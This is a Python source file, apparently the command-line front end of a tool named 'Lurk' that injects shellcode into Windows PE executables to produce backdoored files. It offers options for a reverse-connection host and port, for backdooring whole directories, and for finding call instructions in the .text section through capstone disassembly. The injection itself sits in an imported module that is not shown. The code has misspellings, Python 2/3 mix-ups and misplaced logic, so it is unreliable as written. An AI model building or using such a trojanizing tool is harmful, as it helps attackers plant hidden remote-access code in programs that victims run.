# coding: utf-8

# Author: Ree
# Date: 2018-1-31

import lief
import struct
import os, sys
import signal
import logging
from capstone import *
from binascii import *
from optparse import OptionParser
from pebin import pebin

def signal_ahndler(singal, frame):
    print('\nProgram Exit')
    sys.exit(0)

class LurkMain():
    
    author = """\
        Author:     Ree
    """
    version = """\
        Version:    0.1
    """

    signal.signal(signal.SIGINT, signal_ahndler)

    usage = "usage: %prog <-f filename> <-s shellcode> [-a] [-o output_filename]"

    parser = OptionParser()
    parser.add_option("-f", "--file", dest="FILE", action="store", type="string", help="File to inject")
    parser.add_option("-a", "--append_last_section", default=False, dest="APPEND_SECTION", action="store_true", help="Append shallcode to last section")
    parser.add_option("-o", "--output", dest="OUTPUT", action="store", type="string", help="The backdoor output file")
    parser.add_option("-s", "--shellcode", dest="SHELLCODE", type="string", acton="store", help="Shellcode you want to use in backdoored file")
    parser.add_option("-d", "--directory", dest="DIR", action="store", type="string", help="This is the location you want to backdoor files")
    parser.add_option("-lh", "--left_host", dest="LHOST", action="store", type="string", help="IP for reverse connection")
    parser.add_option("-lp", "--left_port", dest="LPORT", action="store", type="int", help="Port for reverse connection")
    parser.add_option("-i", "--inject", dest="INJECT", action="store_true", default=False, help="Inject code in PE")

    (options, args) = parser.parse_args()

    def __init__(self):
        pass
    
    def get_info(FILE):
        pass

    def check_support(FILE):
        with open(FILE, 'rb') as testbinary:
            header = testbinary.read(4)
        if 'MZ' in header:
            return 'PE'
        
    def get_sepcial_calladdress(peFilePath, mnemonic='call', op_str=None):
        peFile = lief.parse(peFilePath)
        callAddress = []
        sectionTextRawData = ""
        sectionText = peFile.get_section('.text')
        sectionTextContent = sectionText.content
        for _byte in sectionTextContent:
            sectionTextRawData += chr(_byte)
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        for _code in md.disasm(sectionTextRawData, sectionText.virtual_address):
            if _code.mnemonic == mnemonic:
                callAddress.append((_code.address, _code.size))
        return callAddress

    if not options.FILE:
        parser.print_help()
        sys.exit()
    
    is_supported = check_support(options.FILE)
    if is_supported == 'PE':
        suppotred_file = pebin(FILE=options.FILE,
                               OUTPUT=options.OUTPUT,
                               APPEND_SECTION=options.APPEND_SECTION,
                               SHELLCODE=options.SHELLCODE,
                               LHOST=options.LHOST,
                               LPORT=options.LPORT,
                               )
    else:
        print("Not Supported.")
        sys.exit()
    result = suppotred_file.run_this()
    if result is True and suppotred_file.OUTPUT is not None:
        print("File {0} is lurked in 'lurked' directiory.".format(os.path.basename(suppotred_file.OUTPUT)))

if __name__ == "__main__":

    LurkMain()
